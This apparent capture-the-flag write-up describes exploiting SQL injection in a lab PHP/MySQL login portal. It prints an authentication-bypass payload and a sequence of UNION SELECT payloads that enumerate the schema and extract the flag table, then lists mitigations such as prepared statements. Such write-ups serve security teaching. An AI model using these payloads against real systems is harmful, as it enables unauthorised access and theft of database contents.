---
title: "SQL Injection in Login Portal"
slug: "sql-injection-login"
category: "web-application"
description: "Exploiting a blind SQL injection vulnerability in a web application's authentication mechanism to bypass login and extract database contents."
date: "2024-03-15"
---

## Overview

This challenge presented a vulnerable login portal running on a custom PHP backend with a MySQL database. The goal was to bypass authentication and retrieve the flag stored in a hidden database table.

## Reconnaissance

Initial enumeration revealed the following:
- **Target**: `http://10.10.14.22/login.php`
- **Technology**: PHP 8.1, Apache 2.4, MySQL 8.0
- **Open Ports**: 80 (HTTP), 3306 (MySQL — filtered)

Using `gobuster`, I discovered an admin panel at `/admin/dashboard.php` which returned a 302 redirect to the login page.

## Exploitation

### Identifying the Injection Point

The login form accepted `username` and `password` fields via POST. Testing with a simple payload revealed the injection:

```
username: admin' OR '1'='1
password: anything
```

This returned a different error message than a normal failed login, confirming the injection.

### Extracting Data

Using a UNION-based injection, I enumerated the database:

```sql
' UNION SELECT 1,2,3 -- -
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='flags' -- -
' UNION SELECT flag_value,2,3 FROM flags -- -
```

### Flag Retrieved

The flag was stored in the `flags` table under the `flag_value` column.

## Mitigation

- Use parameterised queries (prepared statements)
- Implement input validation and sanitisation
- Apply the principle of least privilege to database accounts
- Deploy a Web Application Firewall (WAF)

## Tools Used

- Burp Suite
- SQLMap
- Gobuster
- curl
